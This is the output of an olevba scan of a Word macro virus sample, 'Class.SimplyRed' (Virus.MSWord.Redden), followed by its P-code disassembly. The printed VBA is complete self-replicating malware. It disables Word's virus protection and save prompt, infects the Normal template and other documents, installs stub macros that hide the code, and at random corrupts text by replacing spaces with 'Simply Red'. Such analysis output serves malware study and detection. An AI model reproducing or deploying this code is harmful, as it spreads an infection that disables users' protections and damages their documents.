olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Redden
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Redden - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'
'      <` .        |       |>     |
'      -' | <'> |> | <.|   |\ <- <|
'               '      '
'  Class.SimplyRed by N|(0†|N (c) 1999
'
'
On Error GoTo Phuck
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Randomize
can = Int(150 * Rnd)
If can = 9 Then
Options.DefaultHighlightColorIndex = wdRed
    Selection.Font.ColorIndex = wdDarkRed
Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    Selection.Find.Replacement.Highlight = True
    With Selection.Find
        .Text = " "
        .Replacement.Text = "Simply Red"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = True
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("Edit").Controls(1).Delete
End If
If ThisDocument.FullName = NormalTemplate.FullName Then
Set dest = ActiveDocument.VBProject.VBComponents("ThisDocument")
Set sour = NormalTemplate.VBProject.VBComponents("ThisDocument")
Else
Set sour = ThisDocument.VBProject.VBComponents("ThisDocument")
Set dest = NormalTemplate.VBProject.VBComponents("ThisDocument")
End If
cou = dest.CodeModule.countoflines
If cou > 0 Then
For j = 1 To cou
dest.CodeModule.DeleteLines (1)
Next j
End If
lin = sour.CodeModule.Lines(1, sour.CodeModule.countoflines)
dest.CodeModule.AddFromString (lin)
already = False
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
aprj = NormalTemplate.VBProject.VBComponents(i).Name
If aprj = "SimplyRed" Then already = True
Next i
If Not already Then
NormalTemplate.VBProject.VBComponents.Add (vbext_ct_StdModule)
NormalTemplate.VBProject.VBComponents(NormalTemplate.VBProject.VBComponents.Count).Name = "SimplyRed"
Set nor = NormalTemplate.VBProject.VBComponents("SimplyRed").CodeModule
eol = Chr(13) + Chr(10)
nor.AddFromString ("Sub ToolsMacro" + eol + "End Sub")
nor.AddFromString ("Sub Organizer" + eol + "End Sub")
nor.AddFromString ("Sub ViewVBCode" + eol + "End Sub")
nor.AddFromString ("Sub FileTemplates" + eol + "End Sub")
End If
Phuck:
End Sub

Private Sub Document_New()
'
'      <` .        |       |>     |
'      -' | <'> |> | <.|   |\ <- <|
'               '      '
'  Class.SimplyRed by N|(0†|N (c) 1999
'
'
On Error GoTo Phuck
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Randomize
can = Int(150 * Rnd)
If can = 9 Then
Options.DefaultHighlightColorIndex = wdRed
    Selection.Font.ColorIndex = wdDarkRed
Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    Selection.Find.Replacement.Highlight = True
    With Selection.Find
        .Text = " "
        .Replacement.Text = "Simply Red"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = True
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("Edit").Controls(1).Delete
End If
If ThisDocument.FullName = NormalTemplate.FullName Then
Set dest = ActiveDocument.VBProject.VBComponents("ThisDocument")
Set sour = NormalTemplate.VBProject.VBComponents("ThisDocument")
Else
Set sour = ThisDocument.VBProject.VBComponents("ThisDocument")
Set dest = NormalTemplate.VBProject.VBComponents("ThisDocument")
End If
cou = dest.CodeModule.countoflines
If cou > 0 Then
For j = 1 To cou
dest.CodeModule.DeleteLines (1)
Next j
End If
lin = sour.CodeModule.Lines(1, sour.CodeModule.countoflines)
dest.CodeModule.AddFromString (lin)
already = False
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
aprj = NormalTemplate.VBProject.VBComponents(i).Name
If aprj = "SimplyRed" Then already = True
Next i
If Not already Then
NormalTemplate.VBProject.VBComponents.Add (vbext_ct_StdModule)
NormalTemplate.VBProject.VBComponents(NormalTemplate.VBProject.VBComponents.Count).Name = "SimplyRed"
Set nor = NormalTemplate.VBProject.VBComponents("SimplyRed").CodeModule
eol = Chr(13) + Chr(10)
nor.AddFromString ("Sub ToolsMacro" + eol + "End Sub")
nor.AddFromString ("Sub Organizer" + eol + "End Sub")
nor.AddFromString ("Sub ViewVBCode" + eol + "End Sub")
nor.AddFromString ("Sub FileTemplates" + eol + "End Sub")

End If
Phuck:
End Sub





Private Sub Document_Open()
'
'      <` .        |       |>     |
'      -' | <'> |> | <.|   |\ <- <|
'               '      '
'  Class.SimplyRed by N|(0†|N (c) 1999
'
'
On Error GoTo Phuck
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Randomize
can = Int(150 * Rnd)
If can = 9 Then
Options.DefaultHighlightColorIndex = wdRed
    Selection.Font.ColorIndex = wdDarkRed
Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    Selection.Find.Replacement.Highlight = True
    With Selection.Find
        .Text = " "
        .Replacement.Text = "Simply Red"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = True
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("Edit").Controls(1).Delete
End If
If ThisDocument.FullName = NormalTemplate.FullName Then
Set dest = ActiveDocument.VBProject.VBComponents("ThisDocument")
Set stlth = ActiveDocument.VBProject
Set sour = NormalTemplate.VBProject.VBComponents("ThisDocument")
Else
Set sour = ThisDocument.VBProject.VBComponents("ThisDocument")
Set dest = NormalTemplate.VBProject.VBComponents("ThisDocument")
Set stlth = NormalTemplate.VBProject
End If
cou = dest.CodeModule.countoflines
If cou > 0 Then
For j = 1 To cou
dest.CodeModule.DeleteLines (1)
Next j
End If
lin = sour.CodeModule.Lines(1, sour.CodeModule.countoflines)
dest.CodeModule.AddFromString (lin)
already = False
cnt = stlth.VBComponents.Count
If cnt <> 0 Then
For i = 1 To cnt
aprj = stlth.VBComponents(i).Name
If aprj = "SimplyRed" Then already = True
Next i
Else
already = False
End If
If Not already Then
stlth.VBComponents.Add (vbext_ct_StdModule)
stlth.VBComponents(NormalTemplate.VBProject.VBComponents.Count).Name = "SimplyRed"
Set nor = stlth.VBComponents("SimplyRed").CodeModule
eol = Chr(13) + Chr(10)
nor.AddFromString ("Sub ToolsMacro" + eol + "End Sub")
nor.AddFromString ("Sub Organizer" + eol + "End Sub")
nor.AddFromString ("Sub ViewVBCode" + eol + "End Sub")
nor.AddFromString ("Sub FileTemplates" + eol + "End Sub")

End If
Phuck:
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Redden
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11264 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	QuoteRem 0x0000 0x0000 ""
' Line #2:
' 	QuoteRem 0x0000 0x0022 "      <` .        |       |>     |"
' Line #3:
' 	QuoteRem 0x0000 0x0022 "      -' | <'> |> | <.|   |\ <- <|"
' Line #4:
' 	QuoteRem 0x0000 0x0017 "               '      '"
' Line #5:
' 	QuoteRem 0x0000 0x0025 "  Class.SimplyRed by N|(0†|N (c) 1999"
' Line #6:
' 	QuoteRem 0x0000 0x0000 ""
' Line #7:
' 	QuoteRem 0x0000 0x0000 ""
' Line #8:
' 	OnError Phuck 
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #11:
' 	ArgsCall Read 0x0000 
' Line #12:
' 	LitDI2 0x0096 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	St can 
' Line #13:
' 	Ld can 
' 	LitDI2 0x0009 
' 	Eq 
' 	IfBlock 
' Line #14:
' 	Ld wdRed 
' 	Ld Options 
' 	MemSt DefaultHighlightColorIndex 
' Line #15:
' 	Ld wdDarkRed 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #16:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #17:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #18:
' 	LitVarSpecial (True)
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	MemSt Highlight 
' Line #19:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #20:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #21:
' 	LitStr 0x000A "Simply Red"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #22:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #23:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #24:
' 	LitVarSpecial (True)
' 	MemStWith Format$ 
' Line #25:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #26:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #27:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #28:
' 	LitVarSpecial (False)
' 	MemStWith MatchSoundsLike 
' Line #29:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #30:
' 	EndWith 
' Line #31:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #32:
' 	LitDI2 0x0001 
' 	LitStr 0x0004 "Edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Eq 
' 	IfBlock 
' Line #35:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set dest 
' Line #36:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set sour 
' Line #37:
' 	ElseBlock 
' Line #38:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set sour 
' Line #39:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set dest 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	Ld dest 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St cou 
' Line #42:
' 	Ld cou 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #43:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld cou 
' 	For 
' Line #44:
' 	LitDI2 0x0001 
' 	Paren 
' 	Ld dest 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #45:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	LitDI2 0x0001 
' 	Ld sour 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	Ld sour 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St lin 
' Line #48:
' 	Ld lin 
' 	Paren 
' 	Ld dest 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #49:
' 	LitVarSpecial (False)
' 	St already 
' Line #50:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #51:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St aprj 
' Line #52:
' 	Ld aprj 
' 	LitStr 0x0009 "SimplyRed"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St already 
' 	EndIf 
' Line #53:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #54:
' 	Ld already 
' 	Not 
' 	IfBlock 
' Line #55:
' 	Ld vbext_ct_StdModule 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Add 0x0001 
' Line #56:
' 	LitStr 0x0009 "SimplyRed"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' Line #57:
' 	SetStmt 
' 	LitStr 0x0009 "SimplyRed"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set nor 
' Line #58:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St eol 
' Line #59:
' 	LitStr 0x000E "Sub ToolsMacro"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #60:
' 	LitStr 0x000D "Sub Organizer"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #61:
' 	LitStr 0x000E "Sub ViewVBCode"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #62:
' 	LitStr 0x0011 "Sub FileTemplates"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	Label Phuck 
' Line #65:
' 	EndSub 
' Line #66:
' Line #67:
' 	FuncDefn (Private Sub Document_New())
' Line #68:
' 	QuoteRem 0x0000 0x0000 ""
' Line #69:
' 	QuoteRem 0x0000 0x0022 "      <` .        |       |>     |"
' Line #70:
' 	QuoteRem 0x0000 0x0022 "      -' | <'> |> | <.|   |\ <- <|"
' Line #71:
' 	QuoteRem 0x0000 0x0017 "               '      '"
' Line #72:
' 	QuoteRem 0x0000 0x0025 "  Class.SimplyRed by N|(0†|N (c) 1999"
' Line #73:
' 	QuoteRem 0x0000 0x0000 ""
' Line #74:
' 	QuoteRem 0x0000 0x0000 ""
' Line #75:
' 	OnError Phuck 
' Line #76:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #77:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #78:
' 	ArgsCall Read 0x0000 
' Line #79:
' 	LitDI2 0x0096 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	St can 
' Line #80:
' 	Ld can 
' 	LitDI2 0x0009 
' 	Eq 
' 	IfBlock 
' Line #81:
' 	Ld wdRed 
' 	Ld Options 
' 	MemSt DefaultHighlightColorIndex 
' Line #82:
' 	Ld wdDarkRed 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #83:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #84:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #85:
' 	LitVarSpecial (True)
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	MemSt Highlight 
' Line #86:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #87:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #88:
' 	LitStr 0x000A "Simply Red"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #89:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #90:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #91:
' 	LitVarSpecial (True)
' 	MemStWith Format$ 
' Line #92:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #93:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #94:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #95:
' 	LitVarSpecial (False)
' 	MemStWith MatchSoundsLike 
' Line #96:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #97:
' 	EndWith 
' Line #98:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #99:
' 	LitDI2 0x0001 
' 	LitStr 0x0004 "Edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #100:
' 	EndIfBlock 
' Line #101:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Eq 
' 	IfBlock 
' Line #102:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set dest 
' Line #103:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set sour 
' Line #104:
' 	ElseBlock 
' Line #105:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set sour 
' Line #106:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set dest 
' Line #107:
' 	EndIfBlock 
' Line #108:
' 	Ld dest 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St cou 
' Line #109:
' 	Ld cou 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #110:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld cou 
' 	For 
' Line #111:
' 	LitDI2 0x0001 
' 	Paren 
' 	Ld dest 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #112:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #113:
' 	EndIfBlock 
' Line #114:
' 	LitDI2 0x0001 
' 	Ld sour 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	Ld sour 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St lin 
' Line #115:
' 	Ld lin 
' 	Paren 
' 	Ld dest 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #116:
' 	LitVarSpecial (False)
' 	St already 
' Line #117:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #118:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St aprj 
' Line #119:
' 	Ld aprj 
' 	LitStr 0x0009 "SimplyRed"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St already 
' 	EndIf 
' Line #120:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #121:
' 	Ld already 
' 	Not 
' 	IfBlock 
' Line #122:
' 	Ld vbext_ct_StdModule 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Add 0x0001 
' Line #123:
' 	LitStr 0x0009 "SimplyRed"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' Line #124:
' 	SetStmt 
' 	LitStr 0x0009 "SimplyRed"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set nor 
' Line #125:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St eol 
' Line #126:
' 	LitStr 0x000E "Sub ToolsMacro"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #127:
' 	LitStr 0x000D "Sub Organizer"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #128:
' 	LitStr 0x000E "Sub ViewVBCode"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #129:
' 	LitStr 0x0011 "Sub FileTemplates"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #130:
' Line #131:
' 	EndIfBlock 
' Line #132:
' 	Label Phuck 
' Line #133:
' 	EndSub 
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' 	FuncDefn (Private Sub Document_Open())
' Line #140:
' 	QuoteRem 0x0000 0x0000 ""
' Line #141:
' 	QuoteRem 0x0000 0x0022 "      <` .        |       |>     |"
' Line #142:
' 	QuoteRem 0x0000 0x0022 "      -' | <'> |> | <.|   |\ <- <|"
' Line #143:
' 	QuoteRem 0x0000 0x0017 "               '      '"
' Line #144:
' 	QuoteRem 0x0000 0x0025 "  Class.SimplyRed by N|(0†|N (c) 1999"
' Line #145:
' 	QuoteRem 0x0000 0x0000 ""
' Line #146:
' 	QuoteRem 0x0000 0x0000 ""
' Line #147:
' 	OnError Phuck 
' Line #148:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #149:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #150:
' 	ArgsCall Read 0x0000 
' Line #151:
' 	LitDI2 0x0096 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	St can 
' Line #152:
' 	Ld can 
' 	LitDI2 0x0009 
' 	Eq 
' 	IfBlock 
' Line #153:
' 	Ld wdRed 
' 	Ld Options 
' 	MemSt DefaultHighlightColorIndex 
' Line #154:
' 	Ld wdDarkRed 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #155:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #156:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #157:
' 	LitVarSpecial (True)
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	MemSt Highlight 
' Line #158:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #159:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #160:
' 	LitStr 0x000A "Simply Red"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #161:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #162:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #163:
' 	LitVarSpecial (True)
' 	MemStWith Format$ 
' Line #164:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #165:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #166:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #167:
' 	LitVarSpecial (False)
' 	MemStWith MatchSoundsLike 
' Line #168:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #169:
' 	EndWith 
' Line #170:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #171:
' 	LitDI2 0x0001 
' 	LitStr 0x0004 "Edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #172:
' 	EndIfBlock 
' Line #173:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Eq 
' 	IfBlock 
' Line #174:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set dest 
' Line #175:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set stlth 
' Line #176:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set sour 
' Line #177:
' 	ElseBlock 
' Line #178:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set sour 
' Line #179:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set dest 
' Line #180:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set stlth 
' Line #181:
' 	EndIfBlock 
' Line #182:
' 	Ld dest 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St cou 
' Line #183:
' 	Ld cou 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #184:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld cou 
' 	For 
' Line #185:
' 	LitDI2 0x0001 
' 	Paren 
' 	Ld dest 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #186:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #187:
' 	EndIfBlock 
' Line #188:
' 	LitDI2 0x0001 
' 	Ld sour 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	Ld sour 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St lin 
' Line #189:
' 	Ld lin 
' 	Paren 
' 	Ld dest 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #190:
' 	LitVarSpecial (False)
' 	St already 
' Line #191:
' 	Ld stlth 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St cnt 
' Line #192:
' 	Ld cnt 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #193:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld cnt 
' 	For 
' Line #194:
' 	Ld i 
' 	Ld stlth 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St aprj 
' Line #195:
' 	Ld aprj 
' 	LitStr 0x0009 "SimplyRed"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St already 
' 	EndIf 
' Line #196:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #197:
' 	ElseBlock 
' Line #198:
' 	LitVarSpecial (False)
' 	St already 
' Line #199:
' 	EndIfBlock 
' Line #200:
' 	Ld already 
' 	Not 
' 	IfBlock 
' Line #201:
' 	Ld vbext_ct_StdModule 
' 	Paren 
' 	Ld stlth 
' 	MemLd VBComponents 
' 	ArgsMemCall Add 0x0001 
' Line #202:
' 	LitStr 0x0009 "SimplyRed"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	Ld stlth 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' Line #203:
' 	SetStmt 
' 	LitStr 0x0009 "SimplyRed"
' 	Ld stlth 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set nor 
' Line #204:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St eol 
' Line #205:
' 	LitStr 0x000E "Sub ToolsMacro"
' 	Ld eol 
' 	Add 
